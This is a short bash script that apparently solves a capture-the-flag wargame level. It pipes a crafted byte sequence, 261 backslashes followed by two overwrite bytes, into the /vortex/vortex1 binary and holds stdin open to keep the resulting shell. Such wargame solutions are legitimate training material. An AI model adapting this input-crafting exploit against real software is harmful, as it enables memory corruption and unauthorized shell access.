#!/usr/bin/env bash

(python -c 'print "\x5c" * 261 + "\xca\x41"'; cat -) | /vortex/vortex1
